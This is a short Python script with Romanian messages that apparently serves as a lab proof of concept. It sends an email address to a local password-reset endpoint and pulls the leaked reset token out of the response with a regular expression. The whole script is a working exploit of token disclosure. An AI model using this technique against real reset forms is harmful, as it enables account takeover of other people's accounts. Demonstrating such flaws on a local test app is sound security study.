import requests
import re

url = "http://127.0.0.1:5000/forgot"
data = {"email": "cosmin2@gmail.com"}

raspuns = requests.post(url, data=data)

match = re.search(r"token-ul tau este (\d+)", raspuns.text)

if match:
    token_interceptat = match.group(1)
    print(f" Success! Token-ul de resetare: {token_interceptat}")
else:
    print("Fail. Token-ul nu a putut fii gasit.")